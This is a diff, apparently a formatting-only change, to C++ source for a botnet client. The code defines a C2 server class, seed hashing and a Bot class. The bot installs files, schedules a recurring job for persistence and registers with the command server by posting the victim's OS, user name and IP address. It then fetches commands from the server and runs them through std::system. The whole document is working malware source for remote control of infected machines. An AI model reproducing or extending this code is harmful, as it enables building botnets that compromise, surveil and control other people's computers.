@@ -17,31 +17,31 @@
 
 class C2Server {
 public:
-	C2Server(const std::string& registerUrl, const std::string& cmdUrl) {
-		_registerUrl = registerUrl;
-		_cmdUrl = cmdUrl;
-	}
+    C2Server(const std::string& registerUrl, const std::string& cmdUrl) {
+        _registerUrl = registerUrl;
+        _cmdUrl = cmdUrl;
+    }
 
-	std::string getRegisterUrl() { return _registerUrl; }
-	std::string getCmdUrl() { return _cmdUrl; }
+    std::string getRegisterUrl() { return _registerUrl; }
+    std::string getCmdUrl() { return _cmdUrl; }
 
 private:
-	std::string _registerUrl, _cmdUrl;
+    std::string _registerUrl, _cmdUrl;
 };
 
 class Seed {
 public:
-	Seed (const std::string& filePath) { _path = filePath; }
-	bool exists();
-	void initSeed();
-	void getSeed();
-	std::string getHash() { return _hash; }
+    Seed (const std::string& filePath) { _path = filePath; }
+    bool exists();
+    void initSeed();
+    void getSeed();
+    std::string getHash() { return _hash; }
 
 private:
-	std::string _path, _hash;
+    std::string _path, _hash;
 
-	void calcHash(const std::string&);
-	void calcHash(std::ifstream&);
+    void calcHash(const std::string&);
+    void calcHash(std::ifstream&);
 };
 
 bool Seed::exists() {
@@ -93,86 +93,86 @@ void Seed::calcHash (std::ifstream& seedFile) {
             std::istreambuf_iterator<char>(),
             hash.begin(),
             hash.end()
-    );
+            );
     std::string hex_str = picosha2::bytes_to_hex_string(hash.begin(), hash.end());
     _hash = hex_str;
 }
 
 class Bot {
 public:
-	Bot(const std::string& seedPath, C2Server* server) {
-		_hashType = HASH_TYPE;
-		_seed = new Seed(seedPath);
+    Bot(const std::string& seedPath, C2Server* server) {
+        _hashType = HASH_TYPE;
+        _seed = new Seed(seedPath);
         _c2Server = server;
-	}
-	~Bot() { delete _seed; }
-	void executeOrder();
+    }
+    ~Bot() { delete _seed; }
+    void executeOrder();
 
-	void init();
-	bool isInit();
+    void init();
+    bool isInit();
 
 private:
-	std::string _hashType, _hashSum, _os, _user, _ipAddr;
-	Seed* _seed;
+    std::string _hashType, _hashSum, _os, _user, _ipAddr;
+    Seed* _seed;
     C2Server* _c2Server;
 
-	void _prepareSysInfo();
-	void _registerBot();
+    void _prepareSysInfo();
+    void _registerBot();
 };
 
 void Bot::init() {
     // Install files and components
-	install::installFiles();
-	_seed->initSeed();
-	_registerBot();
-	install::initRecurringJob();
+    install::installFiles();
+    _seed->initSeed();
+    _registerBot();
+    install::initRecurringJob();
 }
 
 bool Bot::isInit() {
-	return _seed->exists();
+    return _seed->exists();
 }
 
 void Bot::executeOrder() {
-	// Retrieve commands to run and execute
-	_prepareSysInfo();
-	std::string postForm =
-		"hash_sum=" + _hashSum
-		+ "&ip_addr=" + _ipAddr;
-	std::string cmd = request::post(_c2Server->getCmdUrl(), postForm);
-	std::system(cmd.c_str());
+    // Retrieve commands to run and execute
+    _prepareSysInfo();
+    std::string postForm =
+        "hash_sum=" + _hashSum
+        + "&ip_addr=" + _ipAddr;
+    std::string cmd = request::post(_c2Server->getCmdUrl(), postForm);
+    std::system(cmd.c_str());
 }
 
 void Bot::_prepareSysInfo() {
-	// Init or retrieve seed
-	if (_seed->exists()) {
-		_seed->getSeed();
-	} else {
-		_seed->initSeed();
-	}
+    // Init or retrieve seed
+    if (_seed->exists()) {
+        _seed->getSeed();
+    } else {
+        _seed->initSeed();
+    }
 
-	// Retrieve values if they haven't been already
-	if (!(_hashSum.size())) {
-		_hashSum = _seed->getHash();
-	}
-	if(!(_os.size())) {
-		_os = util::getOS();
-	}
-	if(!(_user.size())) {
-		_user = util::getUser();
-	}
-	if(!(_ipAddr.size())) {
-		_ipAddr = util::getIPAddr();
-	}
+    // Retrieve values if they haven't been already
+    if (!(_hashSum.size())) {
+        _hashSum = _seed->getHash();
+    }
+    if(!(_os.size())) {
+        _os = util::getOS();
+    }
+    if(!(_user.size())) {
+        _user = util::getUser();
+    }
+    if(!(_ipAddr.size())) {
+        _ipAddr = util::getIPAddr();
+    }
 }
 
 void Bot::_registerBot() {
     // Register bot with C2 server
-	_prepareSysInfo();
-	std::string postForm =
-		"hash_type=" + _hashType
-		+ "&hash_sum=" + _hashSum
-		+ "&operating_sys=" + _os
-		+ "&user=" + _user
-		+ "&ip_addr=" + _ipAddr;
-	request::post(_c2Server->getRegisterUrl(), postForm);
+    _prepareSysInfo();
+    std::string postForm =
+        "hash_type=" + _hashType
+        + "&hash_sum=" + _hashSum
+        + "&operating_sys=" + _os
+        + "&user=" + _user
+        + "&ip_addr=" + _ipAddr;
+    request::post(_c2Server->getRegisterUrl(), postForm);
 }
